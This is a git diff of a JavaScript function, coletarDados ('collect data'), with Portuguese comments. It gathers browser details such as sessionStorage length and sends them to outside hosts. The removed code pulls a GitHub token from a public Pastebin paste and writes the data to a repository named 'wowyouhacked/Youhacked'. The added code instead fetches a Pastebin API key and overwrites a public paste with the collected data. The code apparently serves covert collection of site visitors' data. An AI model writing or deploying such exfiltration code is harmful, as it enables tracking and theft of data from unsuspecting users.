@@ -13,56 +13,46 @@ function coletarDados() {
         sessionStorage: sessionStorage.length
     };
 
-    // URL do Pastebin com a chave de acesso do GitHub (raw)
-    const pastebinUrl = 'https://pastebin.com/raw/pN9NpSB0'; // URL fornecida por você
+    // URL do Pastebin contendo a API Key
+    const pastebinKeyUrl = 'https://pastebin.com/raw/L6LkHB3B'; // Novo link público fornecido por você
 
-    // Recupera o token do GitHub armazenado no Pastebin
-    fetch(pastebinUrl)
+    // Recupera a API Key do Pastebin armazenada no paste especificado
+    fetch(pastebinKeyUrl)
         .then(response => response.text())
-        .then(token => {
-            // URL do arquivo JSON no seu repositório GitHub
-            const apiUrl = 'https://api.github.com/repos/wowyouhacked/Youhacked/contents/dados-usuarios.json';
+        .then(apiKey => {
+            // ID do Paste que será modificado (parte do link do Pastebin)
+            const pasteId = 'L6LkHB3B'; // ID correto do novo paste público
 
-            // Recupera o SHA do arquivo JSON (caso já exista) para poder atualizá-lo
-            fetch(apiUrl, {
-                method: 'GET',
-                headers: {
-                    'Authorization': `Bearer ${token}`,
-                    'Accept': 'application/vnd.github.v3+json',
-                }
+            // Converte os dados em texto JSON
+            const jsonData = JSON.stringify(dados, null, 2);
+
+            // Configura a URL da API do Pastebin
+            const pastebinApiUrl = `https://pastebin.com/api/api_post.php`;
+
+            // Parâmetros para a requisição na API do Pastebin
+            const formData = new URLSearchParams({
+                api_dev_key: apiKey.trim(), // Chave de desenvolvedor
+                api_option: 'edit', // Editar o paste
+                api_paste_code: jsonData, // Dados JSON convertidos
+                api_paste_key: pasteId // Identificador do paste
+            });
+
+            // Faz a requisição POST para atualizar o paste
+            fetch(pastebinApiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData
             })
-            .then(response => response.json())
-            .then(data => {
-                const sha = data.sha; // Pega o SHA do arquivo se já existir
-
-                // Converte os dados em JSON e em base64
-                const jsonData = JSON.stringify(dados, null, 2);
-                const base64Data = btoa(jsonData); // Codifica os dados em base64
-
-                // Envia os dados para criar ou atualizar o arquivo JSON no GitHub
-                return fetch(apiUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `Bearer ${token}`,
-                        'Accept': 'application/vnd.github.v3+json',
-                    },
-                    body: JSON.stringify({
-                        message: 'Atualizando dados coletados',
-                        content: base64Data,
-                        sha: sha // Inclui o SHA para atualizar o arquivo se ele já existir
-                    })
-                });
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Arquivo JSON atualizado com sucesso:', data);
+            .then(response => response.text())
+            .then(result => {
+                console.log('Dados salvos no Pastebin com sucesso:', result);
             })
             .catch(error => {
-                console.error('Erro ao atualizar o arquivo JSON:', error);
+                console.error('Erro ao salvar os dados no Pastebin:', error);
             });
         })
         .catch(error => {
-            console.error('Erro ao recuperar o token do Pastebin:', error);
+            console.error('Erro ao recuperar a API Key do Pastebin:', error);
         });
 }
 
